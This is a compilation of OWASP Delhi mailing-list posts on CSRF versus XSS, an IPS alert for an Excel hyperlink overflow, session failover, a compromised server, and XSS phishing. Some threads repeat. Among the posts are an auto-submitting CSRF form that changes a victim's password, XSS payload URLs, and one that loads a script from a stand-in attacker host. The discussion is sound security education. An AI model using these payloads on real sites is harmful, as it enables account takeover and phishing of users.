This one is probably one of the biggest security flaws that we might
encounter in 2009, and guess what? it's still a zero-day.

Hello All,

Please clarify the belowmentioned point:

"XSS flaws is susceptible to CSRF because a CSRF attack can exploit the XSS
flaw to steal any non-automatically submitted credential that might be in
place to protect against a CSRF attack"

Dear Pamendra,

I can give you an example where both CSRF and XSS vulnerabilities both are 
in action to amplify the severity of attack.
If one application is allowing to store javascript from User Input and 
display the same somewhere in the site(e.g. area 11) , then it is very 
easy to store 
<img> or <iframe> tag or any other javascript to perform an unauthorized 
actions such as fund transfer (actions which are normally performed with 
CSRF attack) ,stealing the authentication cookie etc.
Now if the application is vulnerable to CSRF then those stored malicious 
javascript will be executed when the victim visit the area (area 11) of 
the site after authentication which is one of the prime requirement of 
CSRF attack.
Often it is referred as Stored CSRF attack but actually it is the CSRF in 
conjunction with XSS attack.

Both are independent of each other. An application may be vulnerable to one
of the attacks but not the other at the same time.

For a CSRF attack, an application does not need to be susceptible to XSS
attack. Often, to execute an XSS attack, one needs to include a script in
the context of the application. So if you can incorporate some scripting you
can execute XSS. Although there are many variations to this, which is
another story. For CSRF, one needs to execute code (not necessarily a
script)  in the authentication context of the user that changes the state of
the application. For example: Changing password, transfering money from his
a/c to the attackers, etc.

Hope that helps. Let me know if any further clarification is required.

Cross-site request forgery, also known as one-click attack or session riding and abbreviated as CSRF ("sea-surf"[1]) or XSRF, is a type of malicious exploit of a website whereby unauthorized commands are transmitted from a user that the website trusts.[2] Unlike cross-site scripting (XSS), which exploits the trust a user has for a particular site, CSRF exploits the trust that a site has in a user's browser.

Message-ID: <f162ba540902050053j11ff74few7e1cd0d9158c1f86@mail.gmail.com>

Hello OWASP Members,

Please clarify the Attack that is done by the Attacker on the WebServer in
the belowmentioned scenerio:

Network description:

Network threat protection (IPS) installed as a part of Symantec endpoint
protection on Microsoft ISA firewall.

Now there are certain requests that are blocked by the firewall which are
making the OUTGOING connections (which are malicious) and IPS detected those
attack signatures as "[SID=21672] HTTP MS Excel Unicode HLINK BO Detected".

Now my question are:
-> What can be the possible thing that is making the oubound connection to
the malicious server.
-> If IPS is capable of detecting the abovementioned signatures for the
outgoing requests, then why it doesnot blok the same request for the
incoming request so that the attack can be blocked at the Perimeter.

I am not really sure about the practical scenario due to no access to
server/IPS logs but just making a blind guess to your problem:

 

-> What can be the possible thing that is making the oubound connection to
the malicious server.

*	Basic and stupid answer could be "false positive" :-) 
*	Possibility could be that there is some Excel file located in web
server path and whenever, a request is made from the client, web server
returns the excel file and IPS triggers an alert. This would be outbound
traffic for the IPS. 
*	If you can check the web server logs for the timestamp when IPS
alert was generated and you don't see any log entry where Excel file was
served to some external client then above point is ruled out. Look for other
programs making connection to external web servers and you may use
SysInternal tools to dig further

 

-> If IPS is capable of detecting the abovementioned signatures for the
outgoing requests, then why it doesnot blok the same request for the
incoming request so that the attack can be blocked at the Perimeter.

I think this is not some network/web attack coming that can be launched
towards the web server as such till the time your web application doesn't
allow users to upload excel files into the application. The attack is
crafted on the top of the function HrShellOpenWithMonikerDisplayName in
hlink.dll that overflows the stack due to long URIs [Refer: CVE-2006-3086].
Such malicious excel files could infect the server/client when a user opens
the excel file and clicks on long URIs. Now, source for such excel files
could be FTP, Website, Mail, SMB Share, other media, etc. Obviously, excel
files could be embedded in Word/PPT files to fool around the users and make
the investigation more time consuming.

 

Hope helpful!

 

Many Thanks,

Dhruv

Subject: [Owasp-delhi] Attack Scenerio

 

Hello OWASP Members,

 

Please clarify the Attack that is done by the Attacker on the WebServer in
the belowmentioned scenerio:

 

Network description:

 

Network threat protection (IPS) installed as a part of Symantec endpoint
protection on Microsoft ISA firewall.

 

Now there are certain requests that are blocked by the firewall which are
making the OUTGOING connections (which are malicious) and IPS detected those
attack signatures as "[SID=21672] HTTP MS Excel Unicode HLINK BO Detected".

 

Now my question are:

-> What can be the possible thing that is making the oubound connection to
the malicious server.

-> If IPS is capable of detecting the abovementioned signatures for the
outgoing requests, then why it doesnot blok the same request for the
incoming request so that the attack can be blocked at the Perimeter.

CSRF is just to force a user execute some command on the server in context
of his already authenticated session. User must be logged into the
application to make the CSRF work. This simple link can make CSRF work -->
http://www.shopping.com/purchase.php?item=car
<http://www.shopping.com/purchase.php?item=car&confirmed=1> &confirmed=1

It doesn't work if there is new browser instance, as in that case session
won't be valid but it can work in browser TAB. Attendees of last meeting can
recall Gunwant's discussion on the same point about Chrome browser and IE 8.

 

Whereas, till the time you don't want to steal client's session data, XSS
doesn't really rely on active session to do the trick. Payload would be
entirely different in this case, like -->
http://www.shopping.com/purchase.php?item=
<http://www.shopping.com/purchase.php?item=%3cscript%3ealert("Mess%20with%20
the%20best,%20die%20like%20the%20rest")%3c/script%3e&confirmed=0>
<script>alert("Mess with the best, die like the rest");</script>&confirmed=0


 

CSRF has nothing to do with XSS but when CSRF is launched with XSS it can
make a difference. 

 

If someone hasn't already read about MySpace Samy story, visit this link -->
http://namb.la/popular/  (No CSRF in the link) :-)

I think there's a slight mistake here. An app vulnerable to XSS is
automatically vulnerable to CSRF.




For a CSRF attack, an application does not need to be susceptible to XSS
attack. Often, to execute an XSS attack, one needs to include a script in
the context of the application. So if you can incorporate some scripting you
can execute XSS. Although there are many variations to this, which is
another story. For CSRF, one needs to execute code (not necessarily a
script)  in the authentication context of the user that changes the state of
the application. For example: Changing password, transfering money from his
a/c to the attackers, etc.

Hope that helps. Let me know if any further clarification is required.

Gunwant

Thanks for the info Dhruv.

Another thing I want to add to the point is this. In my last session, a guy
(Sorry for not remembering the name, my apology) put up an interesting
question.The question was that in order to exploit the CSRF attack, we know
we can craft a GET request via a URL as mentioned in Dhruv's email  But, in
cases wherein POST requests are involved. For example, the request that
changes the password, or transfers the money from a/c to the other. In such
cases *forms* are involved. How come an attacker would socially engineer a
user to fill the form to change his password to what the attacker wants :)

The answer to this is:
The attacker crafts a page which consists of the following code:

<html>
<head>
<script language="JavaScript">
function fnsubmit()
{
window.document.form1.submit();
return;
}
</script>
</head>*

*<body *onload="return fnsubmit()"*>
<form name="form1" action="*changepassword.php*" onload="submit" />
<input type="text" name="username" value="theusername" />
<input type="text" name="password" value="*atckrspass*" />
<input type="submit" value="Click to Submit" />
</form>
</body>
</html>

So once the user clicks the link of the page containing this code, the form
gets submitted automatically with NO user intervention.

Enjoy!

Sir,

Thanks for your answer..

I am worry about the OUTGOING connection that is blocked by the firewall
and If i am right then an OUTGOING connection is that for which the first
request (A SYN packet to complete the TCP three way handshaking) is sent
from from internal network to the external machine.

Now if an Excel file is there on the Server then to accessing that file by
the attacker or someone else (a user) would create an INCOMING CONNECTION
with the server to exploit the vulnerability within the excel file and for
this NO OUTGOING CONNNECTION IS REQUIRED.

Please clarify......:-)

Client makes a request -->
http://www.fileopen.com/open.php?file=someexcel.xls towards the server. This
is incoming request and contains file name in HTTP GET, but filename won't
bring up an alert.

 

Server responds to above request by passing on the XLS file in HTTP Data
which would be outgoing traffic from server to client. XLS contents will be
parsed by IPS, signature match will happen and alert will be triggered.
Connection is for sure INCOMING but the malicious traffic would be outgoing.
IPS signature would be checking the traffic from IN to OUT in this case, I
believe. 

 

Simple way to check this would be to block incoming requests to the server
from external clients and see if outbound connections are still being made
from the server. That would clearly tell you if the triggers are due to
incoming connections made from clients or server is running some malicious
program and making outbound connections.

I think this is not some network/web attack coming that can be launched
towards the web server as such till the time your web application doesn't
allow users to upload excel files into the application. The attack is
crafted on the top of the function HrShellOpenWithMonikerDisplayName in

Hello OWASP Members,

 

Please clarify the Attack that is done by the Attacker on the WebServer in
the belowmentioned scenerio:

 

Network description:

 

Network threat protection (IPS) installed as a part of Symantec endpoint
protection on Microsoft ISA firewall.

 

Now there are certain requests that are blocked by the firewall which are
making the OUTGOING connections (which are malicious) and IPS detected those
attack signatures as "[SID=21672] HTTP MS Excel Unicode HLINK BO Detected".

 

Now my question are:

-> What can be the possible thing that is making the oubound connection to
the malicious server.

-> If IPS is capable of detecting the abovementioned signatures for the
outgoing requests, then why it doesnot blok the same request for the
incoming request so that the attack can be blocked at the Perimeter.

Most of the time signatures are pattern based.

In our case, 
we can stop the attack just by analyzing the *request* for malicious file based upon extension (doc,pdf etc).

In the other case we can block the malicious file based upon the file content in *response* packet.

We implicitly mention in the signature file what is the direction (inbound/outbound) that we are looking for. The direction is always relative......depending upon what we are protecting i.e are we protecting client or server?

I am not really sure about the practical
scenario due to no access to server/IPS logs but just making a blind guess to
your problem: 

 ? 

-> What can be the possible thing that is making the oubound connection
to the malicious server. 


 Basic
     and stupid answer could be ?false positive? J  
 Possibility
     could be that there is some Excel file located in web server path and
     whenever, a request is made from the client, web server returns the excel
     file and IPS triggers an alert. This would be outbound traffic for the
     IPS.  
 If
     you can check the web server logs for the timestamp when IPS alert was
     generated and you don?t see any log entry where Excel file was
     served to some external client then above point is ruled out. Look for
     other programs making connection to external web servers and you may use
     SysInternal tools to dig further 


 ? 

-> If IPS is capable of detecting the abovementioned signatures for
the outgoing requests, then why it doesnot blok the same request for the incoming
request so that the attack can be blocked at the Perimeter. 

I think this is not some network/web attack
coming that can be launched towards the web server as such till the time your
web application doesn?t allow users to upload excel files into the
application. The attack is crafted on the top of the function HrShellOpenWithMonikerDisplayName
in hlink.dll that overflows the stack due to long URIs [Refer: CVE-2006-3086].
Such malicious excel files could infect the server/client when a user opens the
excel file and clicks on long URIs. Now, source for such excel files could be
FTP, Website, Mail, SMB Share, other media, etc. Obviously, excel files could
be embedded in Word/PPT files to fool around the users and make the
investigation more time consuming. 

 ? 

Hope helpful!

Hello OWASP Members,

Please clarify the Attack that is done by the Attacker on the WebServer

Network description:

Network threat protection (IPS) installed as a part of Symantec

Dear OWASP Team,

What happens in a multiserver site if a client accesses a first server (and
establishes a session with it) and then is directed (by a
load balancer) to a second server? What happens to the client session data
in case the original server crashes?
Pls clarify......

There are session migration techniques / centralized session management
which can be used - to prevent session data lose in case of server failures.

Hello,

There are two possibility in case of master server failed:

   1.

   If the session data is stored on the master server locally then the
   established connection with client will be disconnected becouse the
   redirected server has no session data.
   2.

   If the session data is stored on some centralized database and replicated
   using some technique then the established connection with client will not be
   disconnected due to the High Availability, another server stands up as
   master server and shares session data from the centralized database. The
   Session Clustering module provides a comprehensive solution for
   synchronizing session data across a cluster. In this module the sessions
   that "reside" on the server where they were first created are subsequently,
   delivered to other servers in the cluster. This is done by having the
   alternate server, request the session data from the original server. Session
   Clustering HA (High Availability), is an additional safety layer for
   maintaining session information integrity in Web cluster environments. HA
   ensures that sessions will be serviced in case of a single failure.


With Regards,
Deepak Yadav

Most of the authentic vulnerabilities are attached with Bugtraq ID
(SecurityFocus), CVE ID (cve.mitre.org) or OSVDB (osvdb.org). Apart from
these, there are lots of sources like secunia, CERTs, idefense, etc.

hi OWASP members,

I need some sites similar to securityfocus.com 

just some good and official sites to check reported vulnerabilities.

thanks,

Dear OWASP Members,

Please put some light on the following points:

-> While scanning a website using a tool to find out the possible
vulnerabilities...what happens if the Session Time is short for an
application. To overcome this problem should we increase the number of
threads used by the scanner for faster scanning......but it will also
increase the load on the server.

-> While using some Authentication testing tools such as Web Brute
(Webinspect), Brutus .....How does these tools works with an application
having a short Session timeout as cracking passwords took a lot of time
depending upon the strength of the password.

what prevents you from scripting a re-authentication on the login
request page again. Now, I haven't seen an application where there is
a strict timeout even if there is someone actively using it.  Session
timeout happens due to in-activity, i.e. no action from user.

What exactly does this achieve for securing the application ?

http://xkcd.com/538/

Your application passwords are more likely to be compromised due to
bad policies and un-educated users rather than a brute force. However
if you really want to brute force a web-accessible password, you would
need to run a botnet from 1000s of different IP addresses and try a
distributed crack.

Most of the authentic vulnerabilities are
attached with Bugtraq ID (SecurityFocus), CVE ID (cve.mitre.org) or OSVDB (osvdb.org).
Apart from these, there are lots of sources like secunia, CERTs, idefense, etc.

Hi Paramendra,

Obviously these queries are on two line ? one for session keep alive from tools and other from a pwd cracking/brute force.


1.       I guess threads is not the way to get this issue cleared. The session time out may not be the only issue. It could also be that the session gets terminated to unforeseen issues (eg. Load)

2.       In WebInspect, the same is handled using a logout signature verification ? as an when the tool receives a logout signature (regex based ? eg. [status] 302 AND [all] login.aspx) the tool resubmits the login info form.

Hope this clarifies. I am a tech cons with HP on WI and hence I would be able to give you the perspective from our tools only.

Regards
John

hi OWASP members,



Thank you for the over whelming response for "vulnerability reporting sites".



I have addressed another issue:



HTTP RESPONSE SPLITTING



1. What is http response splitting ?

2. Which type of application can have this vulnerability ?

3. Whether it can be present in any site (login module or without 

   login modules) ?

4. How to show the attack ? Or how to show POC step by step with 

   screen shot ?

5. Any dummy or test application to check and understand ?

6. Other details on the vulnerability.



Thanks & regards,

Suresh.

Dear All

 

I would like to know "How an attacker can forcibly open a port on server
without using SSH. I have seen that an hacker was able to do sql injection
and able to insert url redirection in table. 

 

Whenever the hacked site is opened, it redirect the users to hacker's site
pakbugs.org where as it also succeed to open ftp-proxy port 2121 on server.
Please tell me how one can open a port without root permission.

Non-root user can open up any port >=1024 so opening port 2121 is no big
deal :-) 

 

How to open? depends upon various channels excluding SSH --> Remote code
execution vulnerability in network services, file inclusion/execution/upload
vulnerability in web application, already compromised server getting
commands from IRC, BOTs, etc

 

Here are quick remedies:

 

1.	Configure Apache in Chrooted environment - Always
2.	Harden server and underlying services. Use Selinux if it doesn't
cause too much trouble to admin team. 
3.	Regularly check for RootKits using chkrootkit/rkhunter/OSSEC. Also,
search for files with malicious permissions/suid/etc.
4.	Re-look table level permissions in Database.
5.	Firewall rules for web server - DENY IN-OUT, DENY OUT-IN, ALLOW
OUT-IN:80,443, ALLOW MYIP_RANGE-IN:22 (alternative to VPN approach)
6.	Enable login via Public Key Authentication + password (Only) in SSH
configuration
7.	Install TripWire/OSSEC to monitor file
integrity/addition/deletion/changes and alerts you in almost real time
8.	Freeze the process list and install process monitor to alert you in
real time on addition of any new process into the list
9.	Use centralized Syslog with Splunk to keep an eye on bad activities
without allowing bad guys to modify logs
10.	Code secure web applications followed by regular code audits/web
assessment. If hiring a company for routine code audits looks expensive, use
such appliance
(http://www.torridnet.com/codesecure-security-code-review-engine)
11.	If you are struggling a lot with iFrame inserts in your website(s)
then use tool like HackAlert
(http://www.torridnet.com/hackalert-web-application-intrusion-detection) [it
is unique with no other alternative available] to give you real time alerts
the moment there is an iframe insert.

 

Disclosure: Above suggested links belong to our website and should not be
treated as self-promotion rather be considered as recommendation for the
best available.

 

Hope helpful!

Dhruv

Subject: [Owasp-delhi] Phishing with XSS
Message-ID: <f162ba540902250326y40526a80m889df077f58e889f@mail.gmail.com>

Hello OWASP Members,

I have a doubt and here it is......

In performing Phishing with XSS a script like "do.js "


"http://www.attacked-bank.com/module.asp?search=<Script
src=http://attacker-IP-address/do.js/>"

can be used to change the original login page to the attackers choice
without actually changing the URL.

Now my question is that for performing the abovesaid case this script needs
to be executed by the browser without the user's concent. In general
scenerio while requesting for a script like this first a Pop up is given by
the browser asking whether to run or to save the script.

Please suggest.

Hi Parmendra!

I think it's the case regarding IE7 only,otherwise all major web browsers
and their latest versions like FF 3.1,IE 6 and Opera 9.63 will not ask the
user to save the script. However I have not tried all the browsers for your
particular case but in other condtions (while I was doing some experiment
with ClickJacking) they rarely show any warning except IE7 which shows that
an ActiveX control or Popup needs to run.
However the a normal user can accept to click Yes to run the popup.

Wait for other expert comments too....

Hello friends,I dont think IE 7 will ask for the user to save the script. I
have been successfully tested XSS Phishing on Orkut.com with IE7. Seeing at
the Scenario of Nilesh performed, My be it depends on the script you are
using.

The result of this XSS attack depends on how the application processes ( or
how vulnerable it is to ) the 'Search' parameter.

On a successful XSS attack, the attack script in the search parameter must
be embedded in the HTML of the search results page. In this case, the
attack script will just run silently, like other scripts in <script> tags.

The browser (behavior varies depending on MIME type) will prompt you with a
save-as message box only when the XSS attack caused web application
('search' page) to download the remote file and send it to user. FF in my
system just displays the script text. In IE7, after I click open, I am
presented with a security warning about unknown publisher.
